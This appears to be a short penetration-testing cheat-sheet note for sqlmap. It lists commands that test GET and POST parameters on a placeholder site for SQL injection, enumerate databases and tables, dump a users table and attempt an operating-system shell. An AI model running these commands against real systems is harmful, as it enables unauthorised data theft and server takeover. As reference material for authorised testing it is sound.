---
tags:
  - tool
  - web
  - sql
  - injection
---
# sqlmap

Automatically test SQL injection

## Capabilities

```bash
# Test a GET request
sqlmap -u 'https://example.com?vulnerable_parameter=a' --batch
sqlmap -u 'https://example.com?vulnerable_parameter=a' --batch --dbs
sqlmap -u 'https://example.com?vulnerable_parameter=a' -D example_database --tables
sqlmap -u 'https://example.com?vulnerable_parameter=a' -D example_database -T example_users --dump

# Test a POST request with cookie
sqlmap --cookie "key=value" -u 'https://example.com' --method=POST --data "safe_parameter=safe_value&vulerable_parameter=a" --batch
sqlmap --cookie "key=value" -u 'https://example.com' --method=POST --data "safe_parameter=safe_value&vulerable_parameter=a" --batch --dbs
sqlmap --cookie "key=value" -u 'https://example.com' --method=POST --data "safe_parameter=safe_value&vulerable_parameter=a" -D example_database --tables
sqlmap --cookie "key=value" -u 'https://example.com' --method=POST --data "safe_parameter=safe_value&vulerable_parameter=a" -D example_database -T example_users --dump

# Attempt to pop a shell
sqlmap -u 'https://example.com?vulnerable_parameter=a' --os-shell
```
